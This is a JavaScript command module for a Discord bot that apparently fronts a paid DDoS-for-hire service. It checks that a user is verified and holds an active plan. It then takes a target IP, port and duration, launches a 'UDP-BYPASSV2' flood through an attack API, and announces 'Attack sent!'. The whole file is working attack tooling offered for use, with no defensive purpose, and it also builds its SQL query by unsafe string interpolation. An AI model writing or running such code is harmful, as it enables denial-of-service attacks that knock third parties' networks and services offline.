const { MessageEmbed } = require('discord.js');
const ee = require("../../config.json");
const Util = require('../../Util/index');
const util = new Util.default;
module.exports = {
  name: 'udp-bypassv2',
  category: '💎 | VIP Methods',
  description: 'start an UDP-BYPASSV2 attack',
  channelOnly: true,

  /**
   * @param {Client} client
   * @param {Message} message
   * @param {String[]} args
   */

  run: async (client, message, args, pool) => {
    pool.getConnection((err, connection) => {
      if (err) throw err;

      var target = message.author;

      connection.query(`select * from users where discordid='${target.id}'`, async (err, rows) => {
        if (err) throw err;

        var verified = rows[0].discordverified;

        if (verified === 0) return message.reply(new MessageEmbed()
          .setColor(ee.color)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
          .setTitle("❌ Error | you have not verified your Discord account with the bot!")
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        var expires = new Date(rows[0].expires);
        var today = new Date();
        var expired = (expires <= today);

        if (expired === true) return message.reply(new MessageEmbed()
          .setColor(ee.color)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
          .setTitle("❌ Error | you do not have an active plan, purchase one and try again!")
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        const address = args[0];
        const port = args[1];
        const time = args[2];

        /* checks must be correct formatt */
        if (!address || !port || !time) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | \`Correct Usage: [IP] [PORT] [TIME]\`")
          .setColor(ee.color)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))


        /* checking if the port is a number and not a letter */
        if (isNaN(port)) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | **\`Port must be a number\`**")
          .setColor(ee.color)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checking if the port is a number and not a letter */
        if (isNaN(time)) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | **\`Time must be a number\`**")
          .setColor(ee.color)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checking the max time */
        if (time < 10 || time > 1800) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | **Max Time \`[10 - 1800]\` **")
          .setColor(ee.color)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checking the deletes the message after it get's sent  */
        await message.delete()

        /* sends the attack with embed */
        await util.requestAPI("UDP-BYPASSV2", address, port, time);
        return message.channel.send(new MessageEmbed()
          .setThumbnail(client.user.displayAvatarURL())
          .setColor(ee.color)
          .addField("Attack sent!", [
            `> ❯ IP: **${address}**`,
            `> ❯ Port: **${port}**`,
            `> ❯ Time: **${time}**`,
            `> ❯ Method: **UDP-BYPASSV2**`
          ])
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
          .setTimestamp()
        )
      });
      connection.release();
    });
  }
}